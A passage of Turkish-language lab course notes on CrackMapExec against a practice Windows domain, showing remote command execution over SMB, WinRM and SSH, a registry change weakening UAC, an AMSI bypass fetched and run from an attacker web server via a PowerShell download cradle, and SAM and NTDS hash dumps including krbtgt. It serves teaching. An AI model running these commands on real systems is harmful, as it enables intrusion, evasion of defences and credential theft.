17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
MS01\localadmin:Password99!
```

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

```
crackmapexec smb 10.129.204.133 -u Administrator -p 'AnotherC0mpl3xP4$' -
-local-auth -x "reg add
HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V
LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
MS01\Administrator:AnotherC0mpl3xP4$ (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 The operation
completed successfully.

```


```
crackmapexec smb 10.129.204.133 -u localadmin -p Password99! --local-auth
-x whoami

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
MS01\localadmin:Password99! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 ms01\localadmin

```


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -x whoami

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 inlanefreight\robert

```


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --execmethod smbexec -x whoami

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
via smbexec
SMB 10.129.204.133 445 MS01 nt authority\system
```

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --execmethod wmiexec -X '$PSVersionTable'

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command via wmiexec
SMB 10.129.204.133 445 MS01 Name Value
SMB 10.129.204.133 445 MS01 ----
-----
SMB 10.129.204.133 445 MS01 PSVersion 5.1.17763.2268
SMB 10.129.204.133 445 MS01 PSEdition  Desktop
SMB 10.129.204.133 445 MS01 PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}
SMB 10.129.204.133 445 MS01 BuildVersion 10.0.17763.2268
SMB 10.129.204.133 445 MS01 CLRVersion 4.0.30319.42000
SMB 10.129.204.133 445 MS01 WSManStackVersion 3.0
SMB 10.129.204.133 445 MS01 PSRemotingProtocolVersion 2.3
SMB 10.129.204.133 445 MS01 SerializationVersion 1.1.0.1

```


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

```
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/s hantanukhande-amsi.ps1 -q
```


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -X
'$PSVersionTable' --amsi-bypass shantanukhande-amsi.ps1

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
[-] Command exceeds maximum length of 8191 chars (was 3065628). exiting.
[*] Shutting down, please wait...
```

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

```
echo "IEX(New-Object
Net.WebClient).DownloadString('http://10.10.14.33/shantanukhandeamsi.ps1');" > amsibypass.txt

sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -X
'$PSVersionTable' --amsi-bypass amsibypass.txt

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 -- AMSI Patch
SMB 10.129.204.133 445 MS01 -- Modified By:
Shantanu Khandelwal (@shantanukhande)
SMB 10.129.204.133 445 MS01 -- Original Author:
Paul LaArnAc (@am0nsec)
SMB 10.129.204.133 445 MS01
SMB 10.129.204.133 445 MS01 [+] 64-bits process
SMB 10.129.204.133 445 MS01 [+] AMSI DLL Handle: 
140724553187328
SMB 10.129.204.133 445 MS01 [+] DllGetClassObject
address: 140724553193616
SMB 10.129.204.133 445 MS01 [+] Targeted address:
140724553200416
SMB 10.129.204.133 445 MS01
SMB 10.129.204.133 445 MS01 Name
Value
SMB 10.129.204.133 445 MS01 ----
-----
SMB 10.129.204.133 445 MS01 PSVersion
5.1.17763.2268
SMB 10.129.204.133 445 MS01 PSEdition Desktop
SMB 10.129.204.133 445 MS01 PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}
SMB 10.129.204.133 445 MS01 BuildVersion 10.0.17763.2268
SMB 10.129.204.133 445 MS01 CLRVersion 4.0.30319.42000
SMB 10.129.204.133 445 MS01 WSManStackVersion 3.0
SMB 10.129.204.133 445 MS01
PSRemotingProtocolVersion 2.3
SMB 10.129.204.133 445 MS01 SerializationVersion 1.1.0.1

```


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

```
crackmapexec winrm 10.129.204.133 -u robert -p 'Inlanefreight01!' -x
whoami

SMB 10.129.204.133 5985 MS01 [*] Windows 10.0 Build
17763 (name:MS01) (domain:inlanefreight.htb)
HTTP 10.129.204.133 5985 MS01 [*]
http://10.129.204.133:5985/wsman
WINRM 10.129.204.133 5985 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WINRM 10.129.204.133 5985 MS01 [+] Executed command
WINRM 10.129.204.133 5985 MS01 inlanefreight\robert

```


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

```
crackmapexec winrm 10.129.204.133 -u robert -p 'Inlanefreight01!' -X
'$PSVersionTable'

SMB 10.129.204.133 5985 MS01 [*] Windows 10.0 Build
17763 (name:MS01) (domain:inlanefreight.htb)
HTTP 10.129.204.133 5985 MS01 [*]
http://10.129.204.133:5985/wsman
WINRM 10.129.204.133 5985 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WINRM 10.129.204.133 5985 MS01 [+] Executed command
WINRM 10.129.204.133 5985 MS01
Name Value
---- -----
PSVersion 5.1.17763.2268
PSEdition Desktop
PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}
BuildVersion 10.0.17763.2268
CLRVersion 4.0.30319.42000
WSManStackVersion 3.0
PSRemotingProtocolVersion 2.3
SerializationVersion  1.1.0.1
```

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

```
crackmapexec ssh 10.129.204.133 -u robert -p 'Inlanefreight01!' -x
ipconfig

SSH 10.129.204.133 22 10.129.204.133 [*] SSH-2.0-
OpenSSH_for_Windows_7.7
SSH 10.129.204.133 22 10.129.204.133 [+]
robert:Inlanefreight01!
SSH 10.129.204.133 22 10.129.204.133 [+] Executed command
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Windows IP
Configuration
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Ethernet adapter
Ethernet1:
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Connection-specific
DNS Suffix . :
SSH 10.129.204.133 22 10.129.204.133 IPv4 Address. . . . .
. . . . . . : 172.16.1.5
SSH 10.129.204.133 22 10.129.204.133 Subnet Mask . . . . .
. . . . . . : 255.255.255.0
SSH 10.129.204.133 22 10.129.204.133 Default Gateway . . .
. . . . . . :
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Ethernet adapter
Ethernet0 2:
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Connection-specific
DNS Suffix . : .htb
SSH 10.129.204.133 22 10.129.204.133 IPv6 Address. . . . .
. . . . . . : dead:beef::1e2
SSH 10.129.204.133 22 10.129.204.133 IPv6 Address. . . . .
. . . . . . : dead:beef::8c8a:5209:5876:537d
SSH 10.129.204.133 22 10.129.204.133 Link-local IPv6
Address . . . . . : fe80::8c8a:5209:5876:537d%20
SSH 10.129.204.133 22 10.129.204.133 IPv4 Address. . . . .
. . . . . . : 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Subnet Mask . . . . .
. . . . . . : 255.255.0.0
SSH 10.129.204.133 22 10.129.204.133 Default Gateway . . .
. . . . . . : fe80::250:56ff:feb9:b9fc%20
SSH 10.129.204.133 22 10.129.204.133 10.129.0.1
```

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

```
crackmapexec ssh 10.129.204.133 -u julio --key-file id_ed25519 -p "" -x
whoami

SSH 10.129.204.133 22 10.129.204.133 [*] SSH-2.0-
OpenSSH_for_Windows_7.7
SSH 10.129.204.133 22 10.129.204.133 [+] julio: (keyfile:
id_ed25519)
SSH 10.129.204.133 22 10.129.204.133 [+] Executed command
SSH 10.129.204.133 22 10.129.204.133 inlanefreight\julio
```

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --sam

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Dumping SAM hashes
SMB 10.129.204.133 445 MS01
Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0
660cf3453:::
SMB 10.129.204.133 445 MS01
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
SMB 10.129.204.133 445 MS01
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
d7e0c089c0:::
SMB 10.129.204.133 445 MS01
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077a
ee1958e7f78070:::
SMB 10.129.204.133 445 MS01
localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236
ed3f3ac:::
SMB 10.129.204.133 445 MS01
sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f
6:::
SMB 10.129.204.133 445 MS01 [+] Added 6 SAM hashes
to the database

```


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p
'Inlanefreight01!' --ntds

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [-] RemoteOperations
failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB 172.16.1.10 445 DC01 [+] Dumping the NTDS,
this could take a while so go grab a redbull...
SMB 172.16.1.10 445 DC01
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ce590e9af90b47a6a2fdf36
1aa35efaf:::
SMB 172.16.1.10 445 DC01
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
SMB 172.16.1.10 445 DC01
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:742c416996dcf352efd5ac94200f23
8e:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\julio:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88
057e06a81b54e73b949b:::
SMB 172.16.1.10 445 DC01
david:1107:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391de
e0:::
SMB 172.16.1.10 445 DC01
john:1108:aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4723b4e2407ef81a
2:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\svc_workstations:1109:aad3b435b51404eeaad3b435b51404ee:7
247e8d4387e76996ff3f18a34316fdd:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\carlos:2606:aad3b435b51404eeaad3b435b51404ee:a738f92b3c0
8b424ec2d99589a9cce60:::
SMB 172.16.1.10 445 DC01 
inlanefreight.htb\robert:2607:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc82
1b547d09cf28b5864e54b:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\grace:5603:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc821
b547d09cf28b5864e54b:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\peter:5604:aad3b435b51404eeaad3b435b51404ee:58a478135a93
ac3bf058a5ea0e8fdb71:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\alina:5605:aad3b435b51404eeaad3b435b51404ee:a5be3c11831b
ddc88f6d7517615f3d45:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\noemi:6104:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96
ddbd82224270b57f11fc:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\engels:6105:aad3b435b51404eeaad3b435b51404ee:54f45c2b87d
f16aafa336fb6ffbbac59:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\kiosko:6107:aad3b435b51404eeaad3b435b51404ee:f399c1b9e7f
851b949767163c35ae296:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\testaccount:6108:aad3b435b51404eeaad3b435b51404ee:e02ca9
66c5c0b22eba3c8c4c5ae568b1:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\mathew:6109:aad3b435b51404eeaad3b435b51404ee:abfcb587cd2
d0f48967ab753fba96b34:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\svc_ca:6603:aad3b435b51404eeaad3b435b51404ee:828b21c9290
84f0efd75791db7cb963d:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\harris:7104:aad3b435b51404eeaad3b435b51404ee:fb9e4fb946a
15a0c68087bc830b5da12:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\soti:7105:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1
c2baec10a32db22c72d:::
SMB 172.16.1.10 445 DC01
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:f0ec1102494ee338521fb866f5848d
45:::
SMB 172.16.1.10 445 DC01
MS01$:2107:aad3b435b51404eeaad3b435b51404ee:bcbea16a525492f90a27c14217da99
c0:::
SMB 172.16.1.10 445 DC01
LINUX01$:2609:aad3b435b51404eeaad3b435b51404ee:0dcd992b30914be730714233322
dc502:::
SMB 172.16.1.10 445 DC01 [+] Dumped 23 NTDS
hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-
08_190342.ntds of which 20 were added to the database
SMB 172.16.1.10 445 DC01 [*] To extract only
enabled accounts from the output file, run the following command:
SMB 172.16.1.10 445 DC01 [*] cat
/home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-08_190342.ntds | grep -
iv disabled | cut -d ':' -f1
```

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u julio -p Password1 --ntds
--user krbtgt

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB 172.16.1.10 445 DC01 [+] Dumping the NTDS,
this could take a while so go grab a redbull...
SMB 172.16.1.10 445 DC01
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:742c416996dcf352efd5ac94200f23
8e:::
SMB 172.16.1.10 445 DC01 [+] Dumped 1 NTDS
hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-
08_190444.ntds of which 1 were added to the database
SMB 172.16.1.10 445 DC01 [*] To extract only
enabled accounts from the output file, run the following command:
SMB 172.16.1.10 445 DC01 [*] cat
/home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-08_190444.ntds | grep -
iv disabled | cut -d ':' -f1
```

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p
'Inlanefreight01!' --ntds --enabled

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [-] RemoteOperations
failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB 172.16.1.10 445 DC01 [+] Dumping the NTDS,
this could take a while so go grab a redbull...
SMB 172.16.1.10 445 DC01
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ce590e9af90b47a6a2fdf36
1aa35efaf:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\julio:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88
057e06a81b54e73b949b:::
SMB 172.16.1.10 445 DC01
david:1107:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391de
e0:::
SMB 172.16.1.10 445 DC01
john:1108:aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4723b4e2407ef81a
2:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\svc_workstations:1109:aad3b435b51404eeaad3b435b51404ee:7
247e8d4387e76996ff3f18a34316fdd:::
SMB 172.16.1.10 445 DC01
